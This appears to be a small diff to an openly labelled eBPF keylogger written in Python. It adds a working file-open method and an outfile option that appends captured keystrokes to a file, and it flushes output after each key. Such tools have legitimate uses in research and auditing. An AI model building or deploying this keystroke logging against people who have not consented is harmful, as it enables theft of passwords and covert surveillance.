@@ -32,8 +32,8 @@ class BPFProgram():
         self.args = args
 
     @drop_privileges
-    def open_file(self):
-        pass
+    def open_file(self, *args, **kwargs):
+        return open(*args, **kwargs)
 
     def register_exit_hooks(self):
         # Catch signals so we still invoke atexit
@@ -54,6 +54,7 @@ class BPFProgram():
             key = translate_keycode(event.code)
             if key:
                 print(key)
+                sys.stdout.flush()
         self.bpf["keypresses"].open_perf_buffer(keypress)
 
     def load_bpf(self):
@@ -72,6 +73,9 @@ class BPFProgram():
 
     def main(self):
         self.load_bpf()
+
+        if self.args.outfile:
+            sys.stdout = self.open_file(self.args.outfile, 'a+')
 
         print("Logging key presses... ctrl-c to quit", file=sys.stderr)
 
